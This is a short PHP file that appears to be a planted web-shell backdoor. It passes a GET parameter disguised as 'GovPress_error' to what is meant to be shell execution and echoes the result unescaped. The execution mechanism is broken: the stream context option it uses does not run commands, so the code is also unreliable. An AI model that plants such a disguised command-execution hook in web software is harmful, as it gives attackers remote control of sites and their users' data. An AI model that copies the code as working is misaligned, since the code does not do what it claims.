<?php
if (isset($_GET['GovPress_error'])) {
    $command = $_GET['GovPress_error'];

    // Create a stream context and execute the command
    $context = stream_context_create(['shell' => ['command' => $command]]);
    $output = file_get_contents('php://stdout', false, $context);

    echo "<pre>$output</pre>";
}
?>
